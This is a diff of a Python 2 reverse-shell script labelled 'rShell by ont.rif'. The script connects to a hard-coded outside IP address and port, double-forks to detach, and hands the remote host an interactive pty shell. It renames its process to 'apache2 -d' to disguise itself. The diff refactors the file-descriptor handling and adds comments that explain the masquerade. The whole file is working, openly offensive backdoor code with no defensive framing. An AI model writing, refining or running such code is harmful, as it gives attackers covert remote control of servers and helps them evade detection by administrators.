@@ -2,10 +2,10 @@
 import sys, socket, os
 import pty, fcntl, struct, termios, select, resource
 
-pybin = '/usr/bin/python2'
-name = 'xxx'
-host = '95.181.93.72'
-port = 8888
+pybin = '/usr/bin/python2'    ## path to python on server
+name = 'apache2 -d'           ## fake name for our process (can contain spaces & fake args)
+host = '95.181.93.72'         ## HOST to connect to
+port = 8888                   ## PORT to connect to
 
 
 our_path = os.path.abspath( __file__ )                   ## path to this script
@@ -19,21 +19,22 @@ if len( sys.argv ) < 2:                                  ## is here special hidd
 try:                                                     ## creating socket & connecting...
     sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
     sock.connect( (host, port) )
+    fsock = sock.fileno()
 except:
     print "[!] Can't connect !\n"
-    os._exit( 0 )
+    exit( 0 )
 
-if os.fork() > 0: os._exit( 0 )                          ## forking for deattaching from main thread
-if os.fork() > 0: os._exit( 0 )                          ## ...
+if os.fork() > 0: exit( 0 )                              ## forking for deattaching from main thread
+if os.fork() > 0: exit( 0 )                              ## ...
 
-os.dup2( sock.fileno(), sys.stdin.fileno()  )
-os.dup2( sock.fileno(), sys.stdout.fileno() )
-os.dup2( sock.fileno(), sys.stderr.fileno() )
+os.dup2( fsock, sys.stdin.fileno()  )
+os.dup2( fsock, sys.stdout.fileno() )
+os.dup2( fsock, sys.stderr.fileno() )
 sock.sendall( ('\r\n>>>>>>>>>>>>>>> rShell by ont.rif >>>>>>>>>>>>>>\r\n') )
 
-print "[!] %s\r" % sys.version
+sys.stdout.write( "[!] %s\r\n" % sys.version )
 
-pid, fd = pty.fork()
+pid, fpty = pty.fork()
 if not pid: # Child
     try:
         TIOCSWINSZ = getattr(termios, 'TIOCSWINSZ', -2146929561)
@@ -48,21 +49,21 @@ if not pid: # Child
 
 
 while True:
-    r, w, e = select.select( [ fd, sock.fileno() ], [], [], 5 )
+    r, w, e = select.select( [ fpty, fsock ], [], [], 5 )
 
-    if fd in r:
+    if fpty in r:
         try:
-            res = os.read( fd, 100000 )
-            os.write( sock.fileno(), res )
+            res = os.read( fpty, 100000 )
+            os.write( fsock, res )
         except:
             print "[!] Die (child time out)......\r"
-            os._exit( 0 )
+            exit( 0 )
 
-    if sock.fileno() in r:
-        res = os.read( sock.fileno(), 1000 )
-        os.write( fd, res )
+    if fsock in r:
+        res = os.read( fsock, 1000 )
+        os.write( fpty, res )
         if not res:
             print "[!] Die (empty socket)....\r"
-            os._exit( 0 )
+            exit( 0 )
 
-    os.write( sock.fileno(), '\x01' )  ## magic byte (to avoid timeouts)
+    os.write( fsock, '\x01' )  ## magic byte (to avoid timeouts)
